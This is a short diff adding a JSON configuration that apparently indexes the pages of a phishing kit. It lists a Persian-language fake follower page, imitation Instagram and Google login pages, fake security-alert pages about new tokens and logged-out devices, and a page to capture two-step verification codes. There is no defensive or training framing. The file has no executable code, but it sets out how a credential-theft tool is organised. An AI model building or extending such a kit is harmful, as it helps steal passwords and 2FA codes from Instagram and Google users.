@@ -1,0 +1,32 @@
+{
+    "pages":{
+        "instagram":{
+            "follower":{
+                "path":"/instagram/follower",
+                "caption":"persian RTL fake follower page"
+            },
+            "login":{
+                "path":"/instagram/login",
+                "caption":"the login instagram login page"
+            },
+            "security":{
+                "path":"/instagram/security",
+                "caption":"security attention for new token and log out all device"
+            },
+            "towStepSecurity":{
+                "path":"/instagram/towStepSecurity",
+                "caption":"for tow step security code"
+            }
+        },
+        "google":{
+            "login":{
+                "path":"/google/login",
+                "caption":"the login google account login page"
+            },
+            "security":{
+                "path":"/google/security",
+                "caption":"security attention for new token and log out all device"
+            }
+        }
+    }
+}
